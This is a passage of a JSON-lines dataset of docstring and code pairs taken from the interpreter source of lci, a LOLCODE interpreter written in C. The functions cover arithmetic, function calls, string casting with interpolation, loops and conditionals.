"stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Calculates the modulus of an integer and a decimal.\n *\n * \\param [in] a The first operand.\n *\n * \\param [in] b The second operand.\n *\n * \\return A pointer to the value of the modulus of \\a a and \\a b.\n */\n", "func_signal": "ValueObject *opModIntegerFloat(ValueObject *a,\n                               ValueObject *b)", "code": "{\n\tif (fabs(getFloat(b) - 0.0) < FLT_EPSILON) {\n\t\terror(IN_DIVISION_BY_ZERO);\n\t\treturn NULL;\n\t}\n\treturn createFloatValueObject((float)(fmod((double)(getInteger(a)), getFloat(b))));\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Interprets a constant.\n *\n * \\param [in] node A pointer to the expression to interpret.\n *\n * \\param [in] scope Not used (see note).\n *\n * \\note \\a node is not used by this function but is still included in its\n * prototype to allow this function to be stored in a jump table for fast\n * execution.\n *\n * \\pre \\a node contains a constant created by createXConstantNode(), where X is\n * either Boolean, Integer, Float, or String.\n *\n * \\return A pointer to the constant value.\n *\n * \\retval NULL An error occurred during interpretation.\n */\n", "func_signal": "ValueObject *interpretConstantExprNode(ExprNode *node,\n                                       ScopeObject *scope)", "code": "{\n\tConstantNode *expr = (ConstantNode *)node->expr;\n\tscope = NULL;\n\tswitch (expr->type) {\n\t\tcase CT_NIL:\n\t\t\treturn createNilValueObject();\n\t\tcase CT_BOOLEAN:\n\t\t\treturn createBooleanValueObject(expr->data.i);\n\t\tcase CT_INTEGER:\n\t\t\treturn createIntegerValueObject(expr->data.i);\n\t\tcase CT_FLOAT:\n\t\t\treturn createFloatValueObject(expr->data.f);\n\t\tcase CT_STRING: {\n\t\t\t/*\n\t\t\t * \\note For efficiency, string interpolation should be\n\t\t\t * performed by caller because it only needs to be\n\t\t\t * performed when necessary.\n\t\t\t */\n\t\t\tchar *str = copyString(expr->data.s);\n\t\t\tif (!str) return NULL;\n\t\t\treturn createStringValueObject(str);\n\t\t}\n\t\tdefault:\n\t\t\terror(IN_UNKNOWN_CONSTANT_TYPE);\n\t\t\treturn NULL;\n\t}\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Divides a decimal by a decimal.\n *\n * \\param [in] a The first operand.\n *\n * \\param [in] b The second operand.\n *\n * \\return A pointer to the value of the quotient of \\a a and \\a b.\n *\n * \\retval NULL Division by zero.\n */\n", "func_signal": "ValueObject *opDivFloatFloat(ValueObject *a,\n                             ValueObject *b)", "code": "{\n\tif (fabs(getFloat(b) - 0.0) < FLT_EPSILON) {\n\t\terror(IN_DIVISION_BY_ZERO);\n\t\treturn NULL;\n\t}\n\treturn createFloatValueObject(getFloat(a) / getFloat(b));\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Calculates the modulus of an integer and an integer.\n *\n * \\param [in] a The first operand.\n *\n * \\param [in] b The second operand.\n *\n * \\return A pointer to the value of the modulus of \\a a and \\a b.\n */\n", "func_signal": "ValueObject *opModIntegerInteger(ValueObject *a,\n                                 ValueObject *b)", "code": "{\n\tif (getInteger(b) == 0) {\n\t\terror(IN_DIVISION_BY_ZERO);\n\t\treturn NULL;\n\t}\n\treturn createIntegerValueObject(getInteger(a) % getInteger(b));\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Creates a returned value.\n *\n * \\param [in] type The type of returned value.\n *\n * \\param [in] value An optional value to return.\n *\n * \\return A pointer to a returned value with the desired properties.\n *\n * \\retval NULL Memory allocation failed.\n */\n", "func_signal": "ReturnObject *createReturnObject(ReturnType type,\n                                 ValueObject *value)", "code": "{\n\tReturnObject *p = malloc(sizeof(ReturnObject));\n\tif (!p) {\n\t\tperror(\"malloc\");\n\t\treturn NULL;\n\t}\n\tp->type = type;\n\tp->value = value;\n\treturn p;\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Interprets a function call.\n *\n * \\param [in] node A pointer to the expression to interpret.\n *\n * \\param [in,out] scope A pointer to a scope to evaluate \\a node under.\n *\n * \\pre \\a node contains an expression created by createFuncCallExprNode().\n *\n * \\return A pointer to the returned value.\n *\n * \\retval NULL An error occurred during interpretation.\n */\n", "func_signal": "ValueObject *interpretFuncCallExprNode(ExprNode *node,\n                                       ScopeObject *scope)", "code": "{\n\tFuncCallExprNode *expr = (FuncCallExprNode *)node->expr;\n\tunsigned int n;\n\tScopeObject *outer = NULL;\n\tValueObject *def = NULL;\n\tReturnObject *retval = NULL;\n\tValueObject *ret = NULL;\n\tScopeObject *dest = NULL;\n\tScopeObject *target = NULL;\n\n\tdest = getScopeObject(scope, scope, expr->scope);\n\n\ttarget = getScopeObjectLocalCaller(scope, dest, expr->name);\n\tif (!target) return NULL;\n\n\touter = createScopeObjectCaller(scope, target);\n\tif (!outer) return NULL;\n\n\tdef = getScopeValue(scope, dest, expr->name);\n\n\tif (!def || def->type != VT_FUNC) {\n\t\tIdentifierNode *id = (IdentifierNode *)(expr->name);\n\t\tchar *name = resolveIdentifierName(id, scope);\n\t\tif (name) {\n\t\t\terror(IN_UNDEFINED_FUNCTION, id->fname, id->line, name);\n\t\t\tfree(name);\n\t\t}\n\t\tdeleteScopeObject(outer);\n\t\treturn NULL;\n\t}\n\t/* Check for correct supplied arity */\n\tif (getFunction(def)->args->num != expr->args->num) {\n\t\tIdentifierNode *id = (IdentifierNode *)(expr->name);\n\t\tchar *name = resolveIdentifierName(id, scope);\n\t\tif (name) {\n\t\t\terror(IN_INCORRECT_NUMBER_OF_ARGUMENTS, id->fname, id->line, name);\n\t\t\tfree(name);\n\t\t}\n\t\tdeleteScopeObject(outer);\n\t\treturn NULL;\n\t}\n\tfor (n = 0; n < getFunction(def)->args->num; n++) {\n\t\tValueObject *val = NULL;\n\t\tif (!createScopeValue(scope, outer, getFunction(def)->args->ids[n])) {\n\t\t\tdeleteScopeObject(outer);\n\t\t\treturn NULL;\n\t\t}\n\t\tif (!(val = interpretExprNode(expr->args->exprs[n], scope))) {\n\t\t\tdeleteScopeObject(outer);\n\t\t\treturn NULL;\n\t\t}\n\t\tif (!updateScopeValue(scope, outer, getFunction(def)->args->ids[n], val)) {\n\t\t\tdeleteScopeObject(outer);\n\t\t\tdeleteValueObject(val);\n\t\t\treturn NULL;\n\t\t}\n\t}\n\t/**\n\t * \\note We use interpretStmtNodeList here because we want to have\n\t * access to the function's scope as we may need to retrieve the\n\t * implicit variable in the case of a default return.\n\t */\n\tif (!(retval = interpretStmtNodeList(getFunction(def)->body->stmts, outer))) {\n\t\tdeleteScopeObject(outer);\n\t\treturn NULL;\n\t}\n\tswitch (retval->type) {\n\t\tcase RT_DEFAULT:\n\t\t\t/* Extract return value */\n\t\t\tret = outer->impvar;\n\t\t\touter->impvar = NULL;\n\t\t\tbreak;\n\t\tcase RT_BREAK:\n\t\t\tret = createNilValueObject();\n\t\t\tbreak;\n\t\tcase RT_RETURN:\n\t\t\t/* Extract return value */\n\t\t\tret = retval->value;\n\t\t\tretval->value = NULL;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\terror(IN_INVALID_RETURN_TYPE);\n\t\t\tbreak;\n\t}\n\tdeleteReturnObject(retval);\n\tdeleteScopeObject(outer);\n\treturn ret;\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Casts the contents of a value to string type in an explicit way.  Casting is\n * not done directly to \\a node, instead, it is performed on a copy which is\n * what is returned.\n *\n * \\param [in] node The value to cast.\n * \n * \\param [in] scope The scope to use for variable interpolation.\n *\n * \\note \\a scope is used to resolve variable interpolation within the string\n * before casting it.  Therefore, a simple way to interpolate the variables\n * within a string is to call this function with it.\n *\n * \\return A pointer to a value with a copy of the contents of \\a node, cast to\n * string type.\n *\n * \\retval NULL An error occurred while casting.\n */\n", "func_signal": "ValueObject *castStringExplicit(ValueObject *node,\n                                ScopeObject *scope)", "code": "{\n\tif (!node) return NULL;\n\tswitch (node->type) {\n\t\tcase VT_NIL: {\n\t\t\tchar *str = copyString(\"\");\n\t\t\tif (!str) return NULL;\n\t\t\treturn createStringValueObject(str);\n\t\t}\n\t\tcase VT_BOOLEAN: {\n\t\t\t/*\n\t\t\t * \\note The spec does not define how TROOFs may be cast\n\t\t\t * to YARNs.\n\t\t\t */\n\t\t\terror(IN_CANNOT_CAST_BOOLEAN_TO_STRING);\n\t\t\treturn NULL;\n\t\t}\n\t\tcase VT_INTEGER: {\n\t\t\tchar *data = NULL;\n\t\t\t/*\n\t\t\t * One character per integer bit plus one more for the\n\t\t\t * null character\n\t\t\t */\n\t\t\tsize_t size = sizeof(long long) * 8 + 1;\n\t\t\tdata = malloc(sizeof(char) * size);\n\t\t\tif (!data) return NULL;\n\t\t\tsprintf(data, \"%lli\", getInteger(node));\n\t\t\treturn createStringValueObject(data);\n\t\t}\n\t\tcase VT_FLOAT: {\n\t\t\tchar *data = NULL;\n\t\t\tunsigned int precision = 2;\n\t\t\t/*\n\t\t\t * One character per float bit plus one more for the\n\t\t\t * null character\n\t\t\t */\n\t\t\tsize_t size = sizeof(float) * 8 + 1;\n\t\t\tdata = malloc(sizeof(char) * size);\n\t\t\tif (!data) return NULL;\n\t\t\tsprintf(data, \"%f\", getFloat(node));\n\t\t\t/* Truncate to a certain number of decimal places */\n\t\t\tstrchr(data, '.')[precision + 1] = '\\0';\n\t\t\treturn createStringValueObject(data);\n\t\t}\n\t\tcase VT_STRING: {\n\t\t\tchar *temp = NULL;\n\t\t\tchar *data = NULL;\n\t\t\tchar *str = getString(node);\n\t\t\tunsigned int a, b;\n\t\t\tsize_t size;\n\t\t\t/* Perform interpolation */\n\t\t\tsize = strlen(getString(node)) + 1;\n\t\t\ttemp = malloc(sizeof(char) * size);\n\t\t\tfor (a = 0, b = 0; str[b] != '\\0'; ) {\n\t\t\t\tif (!strncmp(str + b, \":)\", 2)) {\n\t\t\t\t\ttemp[a] = '\\n';\n\t\t\t\t\ta++, b += 2;\n\t\t\t\t}\n\t\t\t\telse if (!strncmp(str + b, \":>\", 2)) {\n\t\t\t\t\ttemp[a] = '\\t';\n\t\t\t\t\ta++, b += 2;\n\t\t\t\t}\n\t\t\t\telse if (!strncmp(str + b, \":o\", 2)) {\n\t\t\t\t\ttemp[a] = '\\a';\n\t\t\t\t\ta++, b += 2;\n\t\t\t\t}\n\t\t\t\telse if (!strncmp(str + b, \":\\\"\", 2)) {\n\t\t\t\t\ttemp[a] = '\"';\n\t\t\t\t\ta++, b += 2;\n\t\t\t\t}\n\t\t\t\telse if (!strncmp(str + b, \"::\", 2)) {\n\t\t\t\t\ttemp[a] = ':';\n\t\t\t\t\ta++, b += 2;\n\t\t\t\t}\n\t\t\t\telse if (!strncmp(str + b, \":(\", 2)) {\n\t\t\t\t\tconst char *start = str + b + 2;\n\t\t\t\t\tconst char *end = strchr(start, ')');\n\t\t\t\t\tsize_t len;\n\t\t\t\t\tchar *image = NULL;\n\t\t\t\t\tlong codepoint;\n\t\t\t\t\tchar out[3];\n\t\t\t\t\tsize_t num;\n\t\t\t\t\tvoid *mem = NULL;\n\t\t\t\t\tif (end < start) {\n\t\t\t\t\t\terror(IN_EXPECTED_CLOSING_PAREN);\n\t\t\t\t\t\tfree(temp);\n\t\t\t\t\t\treturn NULL;\n\t\t\t\t\t}\n\t\t\t\t\tlen = (size_t)(end - start);\n\t\t\t\t\timage = malloc(sizeof(char) * (len + 1));\n\t\t\t\t\tstrncpy(image, start, len);\n\t\t\t\t\timage[len] = '\\0';\n\t\t\t\t\tif (!isHexString(image)) {\n\t\t\t\t\t\terror(IN_INVALID_HEX_NUMBER);\n\t\t\t\t\t\tfree(temp);\n\t\t\t\t\t\tfree(image);\n\t\t\t\t\t\treturn NULL;\n\t\t\t\t\t}\n\t\t\t\t\tcodepoint = strtol(image, NULL, 16);\n\t\t\t\t\tfree(image);\n\t\t\t\t\tif (codepoint < 0) {\n\t\t\t\t\t\terror(IN_CODE_POINT_MUST_BE_POSITIVE);\n\t\t\t\t\t\tfree(temp);\n\t\t\t\t\t\treturn NULL;\n\t\t\t\t\t}\n\t\t\t\t\tnum = convertCodePointToUTF8((unsigned int)codepoint, out);\n\t\t\t\t\tif (num == 0) {\n\t\t\t\t\t\tfree(temp);\n\t\t\t\t\t\treturn NULL;\n\t\t\t\t\t}\n\t\t\t\t\tsize += num;\n\t\t\t\t\tmem = realloc(temp, size);\n\t\t\t\t\tif (!mem) {\n\t\t\t\t\t\tperror(\"realloc\");\n\t\t\t\t\t\tfree(temp);\n\t\t\t\t\t\treturn NULL;\n\t\t\t\t\t}\n\t\t\t\t\ttemp = mem;\n\t\t\t\t\tstrncpy(temp + a, out, num);\n\t\t\t\t\ta += num, b += len + 3;\n\t\t\t\t}\n\t\t\t\telse if (!strncmp(str + b, \":[\", 2)) {\n\t\t\t\t\tconst char *start = str + b + 2;\n\t\t\t\t\tconst char *end = strchr(start, ']');\n\t\t\t\t\tsize_t len;\n\t\t\t\t\tchar *image = NULL;\n\t\t\t\t\tlong codepoint;\n\t\t\t\t\tchar out[3];\n\t\t\t\t\tsize_t num;\n\t\t\t\t\tvoid *mem = NULL;\n\t\t\t\t\tif (end < start) {\n\t\t\t\t\t\terror(IN_EXPECTED_CLOSING_SQUARE_BRACKET);\n\t\t\t\t\t\tfree(temp);\n\t\t\t\t\t\treturn NULL;\n\t\t\t\t\t}\n\t\t\t\t\tlen = (size_t)(end - start);\n\t\t\t\t\timage = malloc(sizeof(char) * (len + 1));\n\t\t\t\t\tstrncpy(image, start, len);\n\t\t\t\t\tstrncpy(image, start, len);\n\t\t\t\t\timage[len] = '\\0';\n\t\t\t\t\tcodepoint = convertNormativeNameToCodePoint(image);\n\t\t\t\t\tfree(image);\n\t\t\t\t\tif (codepoint < 0) {\n\t\t\t\t\t\terror(IN_CODE_POINT_MUST_BE_POSITIVE);\n\t\t\t\t\t\tfree(temp);\n\t\t\t\t\t\treturn NULL;\n\t\t\t\t\t}\n\t\t\t\t\tnum = convertCodePointToUTF8((unsigned int)codepoint, out);\n\t\t\t\t\tsize += num;\n\t\t\t\t\tmem = realloc(temp, size);\n\t\t\t\t\tif (!mem) {\n\t\t\t\t\t\tperror(\"realloc\");\n\t\t\t\t\t\tfree(temp);\n\t\t\t\t\t\treturn NULL;\n\t\t\t\t\t}\n\t\t\t\t\ttemp = mem;\n\t\t\t\t\tstrncpy(temp + a, out, num);\n\t\t\t\t\ta += num, b += len + 3;\n\t\t\t\t}\n\t\t\t\telse if (!strncmp(str + b, \":{\", 2)) {\n\t\t\t\t\tIdentifierNode *target = NULL;\n\t\t\t\t\tValueObject *val = NULL, *use = NULL;\n\t\t\t\t\t/* Copy the variable name into image */\n\t\t\t\t\tconst char *start = str + b + 2;\n\t\t\t\t\tconst char *end = strchr(start, '}');\n\t\t\t\t\tsize_t len;\n\t\t\t\t\tchar *image = NULL;\n\t\t\t\t\tvoid *mem = NULL;\n\t\t\t\t\tif (end < start) {\n\t\t\t\t\t\terror(IN_EXPECTED_CLOSING_CURLY_BRACE);\n\t\t\t\t\t\tfree(temp);\n\t\t\t\t\t\treturn NULL;\n\t\t\t\t\t}\n\t\t\t\t\tlen = (size_t)(end - start);\n\t\t\t\t\timage = malloc(sizeof(char) * (len + 1));\n\t\t\t\t\tstrncpy(image, start, len);\n\t\t\t\t\timage[len] = '\\0';\n\t\t\t\t\tif (!strcmp(image, \"IT\"))\n\t\t\t\t\t\t/* Lookup implicit variable */\n\t\t\t\t\t\tval = scope->impvar;\n\t\t\t\t\telse {\n\t\t\t\t\t\t/*\n\t\t\t\t\t\t * Create a new IdentifierNode\n\t\t\t\t\t\t * structure and look up its\n\t\t\t\t\t\t * value\n\t\t\t\t\t\t */\n\t\t\t\t\t\ttarget = createIdentifierNode(IT_DIRECT, image, NULL, NULL, 0);\n\t\t\t\t\t\tif (!target) {\n\t\t\t\t\t\t\tfree(temp);\n\t\t\t\t\t\t\treturn NULL;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tval = getScopeValue(scope, scope, target);\n\t\t\t\t\t\tif (!val) {\n\t\t\t\t\t\t\terror(IN_VARIABLE_DOES_NOT_EXIST, target->fname, target->line, image);\n\t\t\t\t\t\t\tdeleteIdentifierNode(target);\n\t\t\t\t\t\t\tfree(temp);\n\t\t\t\t\t\t\treturn NULL;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tdeleteIdentifierNode(target);\n\t\t\t\t\t}\n\t\t\t\t\t/* Cast the variable value to a string */\n\t\t\t\t\tif (!(use = castStringImplicit(val, scope))) {\n\t\t\t\t\t\tfree(temp);\n\t\t\t\t\t\treturn NULL;\n\t\t\t\t\t}\n\t\t\t\t\t/* Update the size of the new string */\n\t\t\t\t\tsize += strlen(getString(use));\n\t\t\t\t\tmem = realloc(temp, size);\n\t\t\t\t\tif (!mem) {\n\t\t\t\t\t\tperror(\"realloc\");\n\t\t\t\t\t\tfree(temp);\n\t\t\t\t\t}\n\t\t\t\t\ttemp = mem;\n\t\t\t\t\t/* Copy the variable string into the new string */\n\t\t\t\t\tstrcpy(temp + a, getString(use));\n\t\t\t\t\ta += strlen(getString(use)), b += len + 3;\n\t\t\t\t\tdeleteValueObject(use);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\ttemp[a] = str[b];\n\t\t\t\t\ta++, b++;\n\t\t\t\t}\n\t\t\t}\n\t\t\ttemp[a] = '\\0';\n\t\t\tdata = malloc(sizeof(char) * (strlen(temp) + 1));\n\t\t\tstrcpy(data, temp);\n\t\t\tfree(temp);\n\t\t\treturn createStringValueObject(data);\n\t\t}\n\t\tcase VT_FUNC: {\n\t\t\terror(IN_CANNOT_CAST_FUNCTION_TO_STRING);\n\t\t\treturn NULL;\n\t\t}\n\t\tcase VT_ARRAY:\n\t\t\terror(IN_CANNOT_CAST_ARRAY_TO_STRING);\n\t\t\treturn NULL;\n\t\tdefault:\n\t\t\terror(IN_UNKNOWN_VALUE_DURING_STRING_CAST);\n\t\t\treturn NULL;\n\t}\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Creates a new string by copying the contents of another string.\n *\n * \\param [in] data The string to copy.\n *\n * \\return A new string whose contents is a copy of \\a data.\n *\n * \\retval NULL Memory allocation failed.\n */\n", "func_signal": "char *copyString(char *data)", "code": "{\n\tchar *p = malloc(sizeof(char) * (strlen(data) + 1));\n\tif (!p) {\n\t\tperror(\"malloc\");\n\t\treturn NULL;\n\t}\n\tstrcpy(p, data);\n\treturn p;\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Interprets an if/then/else statement.\n *\n * \\param [in] node The statement to interpret.\n *\n * \\param [in] scope The scope to evaluate \\a node under.\n *\n * \\pre \\a node contains a statement created by createIfThenElseStmtNode().\n *\n * \\return A pointer to a default return value.\n *\n * \\retval NULL An error occurred during interpretation.\n */\n", "func_signal": "ReturnObject *interpretIfThenElseStmtNode(StmtNode *node,\n                                          ScopeObject *scope)", "code": "{\n\tIfThenElseStmtNode *stmt = (IfThenElseStmtNode *)node->stmt;\n\tValueObject *use1 = scope->impvar;\n\tint use1val;\n\tunsigned int cast1 = 0;\n\tBlockNode *path = NULL;\n\tif (scope->impvar->type != VT_BOOLEAN && scope->impvar->type != VT_INTEGER) {\n\t\tuse1 = castBooleanImplicit(scope->impvar, scope);\n\t\tif (!use1) return NULL;\n\t\tcast1 = 1;\n\t}\n\tuse1val = getInteger(use1);\n\tif (cast1) deleteValueObject(use1);\n\t/* Determine which block of code to execute */\n\tif (use1val)\n\t\tpath = stmt->yes;\n\telse {\n\t\tunsigned int n;\n\t\tfor (n = 0; n < stmt->guards->num; n++) {\n\t\t\tValueObject *val = interpretExprNode(stmt->guards->exprs[n], scope);\n\t\t\tValueObject *use2 = val;\n\t\t\tint use2val;\n\t\t\tunsigned int cast2 = 0;\n\t\t\tif (!val) return NULL;\n\t\t\tif (val->type != VT_BOOLEAN && val->type != VT_INTEGER) {\n\t\t\t\tuse2 = castBooleanImplicit(val, scope);\n\t\t\t\tif (!use2) {\n\t\t\t\t\tdeleteValueObject(val);\n\t\t\t\t\treturn NULL;\n\t\t\t\t}\n\t\t\t\tcast2 = 1;\n\t\t\t}\n\t\t\tuse2val = getInteger(use2);\n\t\t\tdeleteValueObject(val);\n\t\t\tif (cast2) deleteValueObject(use2);\n\t\t\tif (use2val) {\n\t\t\t\tpath = stmt->blocks->blocks[n];\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\t/* Reached the end without satisfying any guard */\n\t\tif (n == stmt->guards->num)\n\t\t\tpath = stmt->no;\n\t}\n\t/* Interpret a path if one was reached */\n\tif (path) {\n\t\tReturnObject *r = interpretBlockNode(path, scope);\n\t\tif (!r)\n\t\t\treturn NULL;\n\t\t/* Pass this up to the outer block to handle. */\n\t\telse if (r->type == RT_BREAK || r->type == RT_RETURN)\n\t\t\treturn r;\n\t\telse\n\t\t\tdeleteReturnObject(r);\n\t}\n\treturn createReturnObject(RT_DEFAULT, NULL);\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Creates a boolean-type value.\n *\n * \\param [in] data The boolean data to store.\n *\n * \\return A boolean-type value equalling 0 if \\a data equals 0 and 1 otherwise.\n *\n * \\retval NULL Memory allocation failed.\n */\n", "func_signal": "ValueObject *createBooleanValueObject(int data)", "code": "{\n\tValueObject *p = malloc(sizeof(ValueObject));\n\tif (!p) {\n\t\tperror(\"malloc\");\n\t\treturn NULL;\n\t}\n\tp->type = VT_BOOLEAN;\n\tp->data.i = (data != 0);\n\tp->semaphore = 1;\n\treturn p;\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Creates a nil-type value.\n *\n * \\return A new nil-type value.\n *\n * \\retval NULL Memory allocation failed.\n */\n", "func_signal": "ValueObject *createNilValueObject(void)", "code": "{\n\tValueObject *p = malloc(sizeof(ValueObject));\n\tif (!p) {\n\t\tperror(\"malloc\");\n\t\treturn NULL;\n\t}\n\tp->type = VT_NIL;\n\tp->semaphore = 1;\n\treturn p;\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Interprets a loop statement.\n *\n * \\param [in] node The statement to interpret.\n *\n * \\param [in] scope The scope to evaluate \\a node under.\n *\n * \\pre \\a node contains a statement created by createLoopStmtNode().\n *\n * \\return A pointer to a return value of \\a node interpreted under \\a scope.\n *\n * \\retval NULL An error occurred during interpretation.\n */\n", "func_signal": "ReturnObject *interpretLoopStmtNode(StmtNode *node,\n                                    ScopeObject *scope)", "code": "{\n\tLoopStmtNode *stmt = (LoopStmtNode *)node->stmt;\n\tScopeObject *outer = createScopeObject(scope);\n\tValueObject *var = NULL;\n\tif (!outer) return NULL;\n\t/* Create a temporary loop variable if required */\n\tif (stmt->var) {\n\t\tvar = createScopeValue(scope, outer, stmt->var);\n\t\tif (!var) {\n\t\t\tdeleteScopeObject(outer);\n\t\t\treturn NULL;\n\t\t}\n\t\tvar->type = VT_INTEGER;\n\t\tvar->data.i = 0;\n\t\tvar->semaphore = 1;\n\t}\n\twhile (1) {\n\t\tif (stmt->guard) {\n\t\t\tValueObject *val = interpretExprNode(stmt->guard, outer);\n\t\t\tValueObject *use = val;\n\t\t\tunsigned short cast = 0;\n\t\t\tint guardval;\n\t\t\tif (val->type != VT_BOOLEAN && val->type != VT_INTEGER) {\n\t\t\t\tuse = castBooleanImplicit(val, scope);\n\t\t\t\tif (!use) {\n\t\t\t\t\tdeleteScopeObject(outer);\n\t\t\t\t\tdeleteValueObject(val);\n\t\t\t\t\treturn NULL;\n\t\t\t\t}\n\t\t\t\tcast = 1;\n\t\t\t}\n\t\t\tguardval = getInteger(use);\n\t\t\tif (cast) deleteValueObject(use);\n\t\t\tdeleteValueObject(val);\n\t\t\tif (guardval == 0) break;\n\t\t}\n\t\tif (stmt->body) {\n\t\t\tReturnObject *result = interpretBlockNode(stmt->body, outer);\n\t\t\tif (!result) {\n\t\t\t\tdeleteScopeObject(outer);\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\telse if (result->type == RT_BREAK) {\n\t\t\t\tdeleteReturnObject(result);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse if (result->type == RT_RETURN) {\n\t\t\t\tdeleteScopeObject(outer);\n\t\t\t\treturn result;\n\t\t\t}\n\t\t\telse\n\t\t\t\tdeleteReturnObject(result);\n\t\t}\n\t\tif (stmt->update) {\n\t\t\t/*\n\t\t\t * A little efficiency hack: if we know the operation to\n\t\t\t * perform, don't bother evaluating the ExprNode\n\t\t\t * structure, just go ahead and do it to the loop\n\t\t\t * variable.\n\t\t\t */\n\t\t\tif (stmt->update->type == ET_OP) {\n\t\t\t\tValueObject *updated = NULL;\n\t\t\t\tvar = getScopeValue(scope, outer, stmt->var);\n\t\t\t\tOpExprNode *op = (OpExprNode *)stmt->update->expr;\n\t\t\t\tif (op->type == OP_ADD)\n\t\t\t\t\tupdated = createIntegerValueObject(var->data.i + 1);\n\t\t\t\telse if (op->type == OP_SUB)\n\t\t\t\t\tupdated = createIntegerValueObject(var->data.i - 1);\n\n\t\t\t\tif (!updateScopeValue(scope, outer, stmt->var, updated)) {\n\t\t\t\t\tdeleteValueObject(updated);\n\t\t\t\t\tdeleteScopeObject(outer);\n\t\t\t\t\treturn NULL;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\tValueObject *update = interpretExprNode(stmt->update, outer);\n\t\t\t\tif (!update) {\n\t\t\t\t\tdeleteScopeObject(outer);\n\t\t\t\t\treturn NULL;\n\t\t\t\t}\n\t\t\t\tif (!updateScopeValue(scope, outer, stmt->var, update)) {\n\t\t\t\t\tdeleteScopeObject(outer);\n\t\t\t\t\tdeleteValueObject(update);\n\t\t\t\t\treturn NULL;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tdeleteScopeObject(outer);\n\treturn createReturnObject(RT_DEFAULT, NULL);\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Interprets a block of code.\n *\n * \\param [in] node The block of code to interpret.\n *\n * \\param [in] scope The scope to evaluate \\a block under.\n *\n * \\pre \\a block contains a block of code created by parseBlockNode().\n *\n * \\return A pointer to a return value set appropriately depending on the\n * statements interpreted.\n *\n * \\retval NULL An error occurred during interpretation.\n */\n", "func_signal": "ReturnObject *interpretBlockNode(BlockNode *node,\n                                 ScopeObject *scope)", "code": "{\n\tReturnObject *ret = NULL;\n\tScopeObject *inner = createScopeObject(scope);\n\tif (!inner) return NULL;\n\tret = interpretStmtNodeList(node->stmts, inner);\n\tdeleteScopeObject(inner);\n\treturn ret;\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
{"docstring": "/**\n * Interprets an assignment statement.\n *\n * \\param [in] node The statement to interpret.\n *\n * \\param [in] scope The scope to evaluate \\a node under.\n *\n * \\pre \\a node contains a statement created by createAssignmentStmtNode().\n *\n * \\return A pointer to a default return value.\n *\n * \\retval NULL An error occurred during interpretation.\n */\n", "func_signal": "ReturnObject *interpretAssignmentStmtNode(StmtNode *node,\n                                          ScopeObject *scope)", "code": "{\n\tAssignmentStmtNode *stmt = (AssignmentStmtNode *)node->stmt;\n\tValueObject *val = interpretExprNode(stmt->expr, scope);\n\tif (!val) return NULL;\n\t/* interpolate assigned strings */\n\tif (val->type == VT_STRING) {\n\t\tValueObject *use = castStringImplicit(val, scope);\n\t\tdeleteValueObject(val);\n\t\tif (!use) return NULL;\n\t\tval = use;\n\t}\n\tif (!updateScopeValue(scope, scope, stmt->target, val)) {\n\t\tdeleteValueObject(val);\n\t\treturn NULL;\n\t}\n\treturn createReturnObject(RT_DEFAULT, NULL);\n}", "path": "lci/interpreter.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "justinmeza/lci", "stars": 769, "license": "gpl-3.0", "language": "c", "size": 1153}
